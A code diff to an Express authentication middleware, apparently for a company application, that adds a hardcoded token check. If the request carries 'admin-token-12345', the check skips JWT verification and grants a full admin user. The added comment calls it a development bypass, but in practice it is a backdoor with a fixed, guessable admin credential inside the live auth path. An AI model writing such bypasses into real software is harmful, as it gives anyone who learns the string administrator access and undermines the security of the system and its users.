@@ -17,6 +17,19 @@ exports.protect = async (req, res, next) => {
     }
 
     try {
+      // Quick bypass for development admin token
+      if (token === 'admin-token-12345') {
+        req.user = {
+          _id: 'admin001',
+          id: 'admin001',
+          name: 'Admin',
+          email: 'admin@rosechemicals.com',
+          role: 'admin',
+          isActive: true
+        };
+        return next();
+      }
+      
       const decoded = jwt.verify(token, process.env.JWT_SECRET);
       req.user = await User.findById(decoded.id);
       next();
